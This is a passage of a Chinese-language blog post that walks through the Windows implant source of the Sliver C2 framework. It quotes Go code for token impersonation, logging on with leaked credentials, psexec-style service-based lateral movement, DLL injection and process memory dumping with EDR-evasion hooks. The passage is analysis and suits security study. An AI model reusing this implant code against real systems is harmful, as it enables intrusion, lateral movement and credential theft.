+<li>3）通过<code>GetTokenInformation</code>获取Token信息，包含<code>LUID</code>，<code>attributes</code>,完整性级别。</li>
+</ul>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line">func GetPrivs() ([]PrivilegeInfo, string, string, <span class="keyword">error</span>) </div><div class="line">&#123;</div><div class="line">[....]</div><div class="line">	<span class="comment">// Get a handle for the current process</span></div><div class="line">	currentProcHandle, <span class="keyword">err</span> := windows.GetCurrentProcess()</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line">		<span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">		<span class="keyword">log</span>.Println(<span class="string">"Could not get a handle for the current process: "</span>, <span class="keyword">err</span>)</div><div class="line">		<span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">		<span class="keyword">return</span> nil, integrity, processName, <span class="keyword">err</span></div><div class="line">	&#125;</div><div class="line">[....]</div><div class="line">	<span class="comment">// Get the process token from the current process</span></div><div class="line">	<span class="keyword">err</span> = windows.OpenProcessToken(currentProcHandle, windows.TOKEN_QUERY, &amp;tokenHandle)</div><div class="line">	<span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line">		<span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">		<span class="keyword">log</span>.Println(<span class="string">"Could not open process token: "</span>, <span class="keyword">err</span>)</div><div class="line">		<span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">		<span class="keyword">return</span> nil, integrity, processName, <span class="keyword">err</span></div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="comment">// Get the size of the token information buffer so we know how large of a buffer to allocate</span></div><div class="line">	<span class="comment">// This produces an error about a data area passed to the syscall being too small, but</span></div><div class="line">	<span class="comment">// we do not care about that because we just want to know how big of a buffer to make</span></div><div class="line">	windows.GetTokenInformation(tokenHandle, windows.TokenPrivileges, nil, 0, &amp;tokenInfoBufferSize)</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="comment">// Make the buffer and get token information</span></div><div class="line">	<span class="comment">// Using a bytes Buffer so that we can Read from it later</span></div><div class="line">	tokenInfoBuffer := bytes.NewBuffer(make([]byte, tokenInfoBufferSize))</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="keyword">err</span> = windows.GetTokenInformation(tokenHandle,</div><div class="line">		windows.TokenPrivileges,</div><div class="line">		&amp;tokenInfoBuffer.Bytes()[0],</div><div class="line">		uint32(tokenInfoBuffer.Len()),</div><div class="line">		&amp;tokenInfoBufferSize,</div><div class="line">	)</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line">		<span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">		<span class="keyword">log</span>.Println(<span class="string">"Error in call to GetTokenInformation (privileges): "</span>, <span class="keyword">err</span>)</div><div class="line">		<span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">		<span class="keyword">return</span> nil, integrity, processName, <span class="keyword">err</span></div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="comment">// The first 32 bits is the number of privileges in the structure</span></div><div class="line">	<span class="keyword">var</span> privilegeCount uint32</div><div class="line">	<span class="keyword">err</span> = binary.<span class="keyword">Read</span>(tokenInfoBuffer, binary.LittleEndian, &amp;privilegeCount)</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line">		<span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">		<span class="keyword">log</span>.Println(<span class="string">"Could not read the number of privileges from the token information."</span>)</div><div class="line">		<span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">		<span class="keyword">return</span> nil, integrity, processName, <span class="keyword">err</span></div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="comment">/*</span></div><div class="line"><span class="comment">		The remaining bytes contain the privileges themselves</span></div><div class="line"><span class="comment">		LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY]</span></div><div class="line"><span class="comment">		Structure of the array: https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-luid_and_attributes</span></div><div class="line"><span class="comment">	*/</span></div><div class="line">[....]</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="comment">// Get the process integrity before we leave</span></div><div class="line">	integrity, <span class="keyword">err</span> = getProcessIntegrityLevel(tokenHandle)</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line">		<span class="keyword">return</span> privInfo, <span class="string">"Could not determine integrity level"</span>, processName, <span class="keyword">err</span></div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="keyword">return</span> privInfo, integrity, processName, nil</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="0x05-getststem"><a href="#0x05-getststem" class="headerlink" title="0x05 getststem"></a>0x05 getststem</h3><h3 id="0x06-impersonate"><a href="#0x06-impersonate" class="headerlink" title="0x06 impersonate"></a>0x06 impersonate</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;用于模拟用户登录(token)，可以利用模拟用户登录来获取SYSTEM<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>https://github.com/BishopFox/sliver/blob/v1.5.30/implant/sliver/priv/priv_windows.go</code>的impersonate方法中，核心是调用ImpersonateLoggedOnUser进行模拟登录，主要分为4步。</p>
+<ul>
+<li>1）首先通过<code>OpenProcess</code>,<code>OpenProcessToken</code>获取进程Token句柄。</li>
+<li>2）通过<code>ImpersonateLoggedOnUser</code>进行模拟登录。</li>
+<li>3）通过<code>DuplicateTokenEx</code>复制令牌，其实只是为了返回一个Token句柄罢了。</li>
+<li>4）分别启用当前进程的线程的”SeAssignPrimaryTokenPrivilege”, “SeIncreaseQuotaPrivilege”权限。</li>
+</ul>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">func impersonateProcess(pid uint32) (newToken windows.<span class="keyword">Token</span>, <span class="keyword">err</span> <span class="keyword">error</span>) &#123;</div><div class="line">	<span class="keyword">var</span> attr windows.SecurityAttributes</div><div class="line">	<span class="keyword">var</span> requiredPrivileges = []string&#123;<span class="string">"SeAssignPrimaryTokenPrivilege"</span>, <span class="string">"SeIncreaseQuotaPrivilege"</span>&#125;</div><div class="line">	primaryToken, <span class="keyword">err</span> := getPrimaryToken(pid)</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line">		<span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">		<span class="keyword">log</span>.Println(<span class="string">"getPrimaryToken failed:"</span>, <span class="keyword">err</span>)</div><div class="line">		<span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">		<span class="built_in">return</span></div><div class="line">	&#125;</div><div class="line">	defer primaryToken.<span class="keyword">Close</span>()</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="keyword">err</span> = syscalls.ImpersonateLoggedOnUser(*primaryToken)</div><div class="line">	<span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line">		<span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">		<span class="keyword">log</span>.Println(<span class="string">"impersonateLoggedOnUser failed:"</span>, <span class="keyword">err</span>)</div><div class="line">		<span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">		<span class="built_in">return</span></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">err</span> = windows.DuplicateTokenEx(*primaryToken, windows.TOKEN_ALL_ACCESS, &amp;attr, windows.SecurityDelegation, windows.TokenPrimary, &amp;newToken)</div><div class="line">	<span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line">		<span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">		<span class="keyword">log</span>.Println(<span class="string">"duplicateTokenEx failed:"</span>, <span class="keyword">err</span>)</div><div class="line">		<span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">		<span class="built_in">return</span></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">for</span> _, priv := <span class="keyword">range</span> requiredPrivileges &#123;</div><div class="line">		<span class="keyword">err</span> = enableCurrentThreadPrivilege(priv)</div><div class="line">		<span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line">			<span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">			<span class="keyword">log</span>.Println(<span class="string">"Failed to set priv"</span>, priv)</div><div class="line">			<span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">			<span class="built_in">return</span></div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="built_in">return</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="0x07-make-token"><a href="#0x07-make-token" class="headerlink" title="0x07 make-token"></a>0x07 make-token</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;用已经泄露的用户信息进行登录形成一个新的token用于登录，在<code>https://github.com/BishopFox/sliver/blob/v1.5.30/implant/sliver/priv/priv_windows.go</code>的MakeToken方法中，核心是调用<code>.LogonUser</code>和<code>ImpersonateLoggedOnUser</code>进行登陆。</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">func MakeToken(domain string, username string, password string) <span class="keyword">error</span> &#123;</div><div class="line">	<span class="keyword">var</span> <span class="keyword">token</span> windows.<span class="keyword">Token</span></div><div class="line"><span class="comment">//</span></div><div class="line">	pd, <span class="keyword">err</span> := windows.UTF16PtrFromString(domain)</div><div class="line">	<span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">err</span></div><div class="line">	&#125;</div><div class="line">	pu, <span class="keyword">err</span> := windows.UTF16PtrFromString(username)</div><div class="line">	<span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">err</span></div><div class="line">	&#125;</div><div class="line">	pp, <span class="keyword">err</span> := windows.UTF16PtrFromString(password)</div><div class="line">	<span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">err</span></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">err</span> = syscalls.LogonUser(pu, pd, pp, syscalls.LOGON32_LOGON_NEW_CREDENTIALS, syscalls.LOGON32_PROVIDER_DEFAULT, &amp;<span class="keyword">token</span>)</div><div class="line">	<span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line">		<span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">		<span class="keyword">log</span>.Printf(<span class="string">"LogonUser failed: %v\n"</span>, <span class="keyword">err</span>)</div><div class="line">		<span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">		<span class="keyword">return</span> <span class="keyword">err</span></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">err</span> = syscalls.ImpersonateLoggedOnUser(<span class="keyword">token</span>)</div><div class="line">	<span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line">		<span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">		<span class="keyword">log</span>.Println(<span class="string">"impersonateLoggedOnUser failed:"</span>, <span class="keyword">err</span>)</div><div class="line">		<span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">		<span class="keyword">return</span> <span class="keyword">err</span></div><div class="line">	&#125;</div><div class="line">	CurrentToken = <span class="keyword">token</span></div><div class="line">	<span class="keyword">return</span> <span class="keyword">err</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="0x08-psexec"><a href="#0x08-psexec" class="headerlink" title="0x08 psexec"></a>0x08 psexec</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用psexec原理进行命令执行。代码位于<code>https://github.com/BishopFox/sliver/blob/v1.5.30/client/command/exec/psexec.go</code>的PsExecCmd方法。首先会从Profile中读取Service的二进制数据，并上传到目标主机，然后，创建和开启服务即可。Service二进制文件肯定是和正常的Psexec功能差不多。利用管道和拉起的进程通讯。并将结果传入发送给C2。</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line">func PsExecCmd(ctx *grumble.Context, <span class="built_in">con</span> *console.SliverConsoleClient) &#123;</div><div class="line">	session := <span class="built_in">con</span>.ActiveTarget.GetSessionInteractive()</div><div class="line">	<span class="keyword">if</span> session == nil &#123;</div><div class="line">		<span class="keyword">return</span></div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	var serviceBinary []byte</div><div class="line">	profile := ctx.Flags.<span class="keyword">String</span>(<span class="string">"profile"</span>)</div><div class="line">	serviceName := ctx.Flags.<span class="keyword">String</span>(<span class="string">"service-name"</span>)</div><div class="line">	serviceDesc := ctx.Flags.<span class="keyword">String</span>(<span class="string">"service-description"</span>)</div><div class="line">	binPath := ctx.Flags.<span class="keyword">String</span>(<span class="string">"binpath"</span>)</div><div class="line">	customExe := ctx.Flags.<span class="keyword">String</span>(<span class="string">"custom-exe"</span>)</div><div class="line">	uploadPath := fmt.Sprintf(`\\%s\%s`, hostname, strings.ReplaceAll(strings.ToLower(ctx.Flags.<span class="keyword">String</span>(<span class="string">"binpath"</span>)), <span class="string">"c:"</span>, <span class="string">"C$"</span>))</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="keyword">if</span> customExe == <span class="string">""</span> &#123;</div><div class="line">		<span class="keyword">if</span> profile == <span class="string">""</span> &#123;</div><div class="line">			<span class="built_in">con</span>.PrintErrorf(<span class="string">"You need to pass a profile name, see `help psexec` for more info\n"</span>)</div><div class="line">			<span class="keyword">return</span></div><div class="line">		&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">[....]</div><div class="line">		serviceBinary, _ = generate.GetSliverBinary(implantProfile, <span class="built_in">con</span>)</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="comment">// use a custom exe instead of generating a new Sliver</span></div><div class="line">		fileBytes, err := os.ReadFile(customExe)</div><div class="line">		<span class="keyword">if</span> err != nil &#123;</div><div class="line">			<span class="built_in">con</span>.PrintErrorf(<span class="string">"Error reading custom executable '%s'\n"</span>, customExe)</div><div class="line">			<span class="keyword">return</span></div><div class="line">		&#125;</div><div class="line">		serviceBinary = fileBytes</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	upload, err := <span class="built_in">con</span>.Rpc.Upload(context.Background(), &amp;sliverpb.UploadReq&#123;</div><div class="line">		Encoder: <span class="string">"gzip"</span>,</div><div class="line">		Data:    uploadGzip,</div><div class="line">		Path:    filePath,</div><div class="line">		Request: <span class="built_in">con</span>.ActiveTarget.Request(ctx),</div><div class="line">	&#125;)</div><div class="line">	<span class="built_in">time</span>.<span class="built_in">Sleep</span>(<span class="number">5</span> * <span class="built_in">time</span>.Second)</div><div class="line">	<span class="comment">// start service</span></div><div class="line">[...]</div><div class="line">	<span class="built_in">con</span>.SpinUntil(<span class="string">"Starting service ..."</span>, serviceCtrl)</div><div class="line">	start, err := <span class="built_in">con</span>.Rpc.StartService(context.Background(), &amp;sliverpb.StartServiceReq&#123;</div><div class="line">		BinPath:            binaryPath,</div><div class="line">		Hostname:           hostname,</div><div class="line">		Request:            <span class="built_in">con</span>.ActiveTarget.Request(ctx),</div><div class="line">		ServiceDescription: serviceDesc,</div><div class="line">		ServiceName:        serviceName,</div><div class="line">		Arguments:          <span class="string">""</span>,</div><div class="line">	&#125;)</div><div class="line">	serviceCtrl &lt;- true</div><div class="line">	&lt;-serviceCtrl</div><div class="line">	<span class="keyword">if</span> err != nil &#123;</div><div class="line">		<span class="built_in">con</span>.PrintErrorf(<span class="string">"Error: %v\n"</span>, err)</div><div class="line">		<span class="keyword">return</span></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span> start.Response != nil &amp;&amp; start.Response.Err != <span class="string">""</span> &#123;</div><div class="line">		<span class="built_in">con</span>.PrintErrorf(<span class="string">"Error: %s"</span>, start.Response.Err)</div><div class="line">		<span class="keyword">return</span></div><div class="line">	&#125;</div><div class="line">	<span class="built_in">con</span>.PrintInfof(<span class="string">"Successfully started service on %s (%s)\n"</span>, hostname, binaryPath)</div><div class="line">	removeChan := <span class="built_in">make</span>(chan <span class="keyword">bool</span>)</div><div class="line">	<span class="built_in">con</span>.SpinUntil(<span class="string">"Removing service ..."</span>, removeChan)</div><div class="line">	removed, err := <span class="built_in">con</span>.Rpc.RemoveService(context.Background(), &amp;sliverpb.RemoveServiceReq&#123;</div><div class="line">		ServiceInfo: &amp;sliverpb.ServiceInfoReq&#123;</div><div class="line">			Hostname:    hostname,</div><div class="line">			ServiceName: serviceName,</div><div class="line">		&#125;,</div><div class="line">		Request: <span class="built_in">con</span>.ActiveTarget.Request(ctx),</div><div class="line">	&#125;)</div><div class="line">[...]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="0x09-runas"><a href="#0x09-runas" class="headerlink" title="0x09 runas"></a>0x09 runas</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以token方式执行，在<code>https://github.com/BishopFox/sliver/blob/v1.5.30/implant/sliver/handlers/handlers_windows.go</code>的<code>runAsHandler</code>和<code>https://github.com/BishopFox/sliver/blob/v1.5.30/implant/sliver/priv/priv_windows.go</code>的RunProcessAsUser函数中。</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">func runAsHandler(data []byte, resp RPCResponse) &#123;</div><div class="line">	runAsReq := &amp;sliverpb.RunAsReq&#123;&#125;</div><div class="line">	<span class="keyword">err</span> := proto.Unmarshal(data, runAsReq)</div><div class="line">	<span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line">		<span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">		<span class="keyword">log</span>.Printf(<span class="string">"error decoding message: %v"</span>, <span class="keyword">err</span>)</div><div class="line">		<span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">		<span class="built_in">return</span></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">out</span>, <span class="keyword">err</span> := priv.RunProcessAsUser(runAsReq.Username, runAsReq.ProcessName, runAsReq.<span class="keyword">Args</span>)</div><div class="line">	runAs := &amp;sliverpb.RunAs&#123;</div><div class="line">		Output: <span class="keyword">out</span>,</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</div><div class="line">		runAs.Response = &amp;commonpb.Response&#123;<span class="keyword">Err</span>: <span class="keyword">err</span>.<span class="keyword">Error</span>()&#125;</div><div class="line">	&#125;</div><div class="line">	data, <span class="keyword">err</span> = proto.Marshal(runAs)</div><div class="line">	resp(data, <span class="keyword">err</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="0x10-spawdll"><a href="#0x10-spawdll" class="headerlink" title="0x10 spawdll"></a>0x10 spawdll</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本质就是通过CreateRemoteThread进行Dll注入。位于<code>https://github.com/BishopFox/sliver/blob/v1.5.30/implant/sliver/handlers/handlers_windows.go</code>的spawnDllHandler方法。和<code>https://github.com/BishopFox/sliver/blob/v1.5.30/implant/sliver/taskrunner/task_windows.go</code>的<code>SpawnDll</code>方法。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">SpawnDll</span><span class="params">(procName <span class="keyword">string</span>, processArgs []<span class="keyword">string</span>, ppid <span class="keyword">uint32</span>, data []<span class="keyword">byte</span>, offset <span class="keyword">uint32</span>, args <span class="keyword">string</span>, kill <span class="keyword">bool</span>)</span> <span class="params">(<span class="keyword">string</span>, error)</span></span> &#123;</div><div class="line">[....]</div><div class="line">	<span class="comment">// 1 - Start process</span></div><div class="line">	cmd, err := startProcess(procName, processArgs, ppid, &amp;stdoutBuff, &amp;stderrBuff, <span class="literal">true</span>)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="string">""</span>, err</div><div class="line">	&#125;</div><div class="line">	pid := cmd.Process.Pid</div><div class="line">	<span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">	log.Printf(<span class="string">"[*] %s started, pid = %d\n"</span>, procName, pid)</div><div class="line">	<span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">	handle, err := windows.OpenProcess(syscalls.PROCESS_DUP_HANDLE, <span class="literal">true</span>, <span class="keyword">uint32</span>(pid))</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="string">""</span>, err</div><div class="line">	&#125;</div><div class="line">	currentProcHandle, err := windows.GetCurrentProcess()</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="comment">// &#123;&#123;if .Config.Debug&#125;&#125;</span></div><div class="line">		log.Println(<span class="string">"GetCurrentProcess failed"</span>)</div><div class="line">		<span class="comment">// &#123;&#123;end&#125;&#125;</span></div><div class="line">		<span class="keyword">return</span> <span class="string">""</span>, err</div><div class="line">	&#125;</div><div class="line">	err = windows.DuplicateHandle(handle, currentProcHandle, currentProcHandle, &amp;lpTargetHandle, <span class="number">0</span>, <span class="literal">false</span>, syscalls.DUPLICATE_SAME_ACCESS)</div><div class="line">[...]</div><div class="line">	dataAddr, err := allocAndWrite(data, lpTargetHandle, <span class="keyword">uint32</span>(<span class="built_in">len</span>(data)))</div><div class="line">	argAddr := <span class="keyword">uintptr</span>(<span class="number">0</span>)</div><div class="line">[...]</div><div class="line">	log.Printf(<span class="string">"[*] Args addr: 0x%08x\n"</span>, argAddr)</div><div class="line">	<span class="comment">//&#123;&#123;end&#125;&#125;</span></div><div class="line">	startAddr := <span class="keyword">uintptr</span>(dataAddr) + <span class="keyword">uintptr</span>(offset)</div><div class="line">	threadHandle, err := protectAndExec(lpTargetHandle, dataAddr, startAddr, argAddr, <span class="keyword">uint32</span>(<span class="built_in">len</span>(data)))</div><div class="line">[...]</div><div class="line">	<span class="keyword">return</span> <span class="string">""</span>, <span class="literal">nil</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="0x11-procdump"><a href="#0x11-procdump" class="headerlink" title="0x11 procdump"></a>0x11 procdump</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;procdump进行进程转储，本质利用MiniDumpWriteDump的回调方法进行进程转储。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">minidump</span><span class="params">(pid <span class="keyword">uint32</span>, proc windows.Handle)</span> <span class="params">(ProcessDump, error)</span></span> &#123;</div><div class="line">	dump := &amp;WindowsDump&#123;&#125;</div><div class="line">	<span class="comment">// &#123;&#123;if eq .Config.GOARCH "amd64"&#125;&#125;</span></div><div class="line">	<span class="comment">// Hotfix for #66 - need to dig deeper</span></div><div class="line">	<span class="comment">// &#123;&#123;if .Config.Evasion&#125;&#125;</span></div><div class="line">	err := evasion.RefreshPE(<span class="string">`c:\windows\system32\ntdll.dll`</span>)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		<span class="comment">//&#123;&#123;if 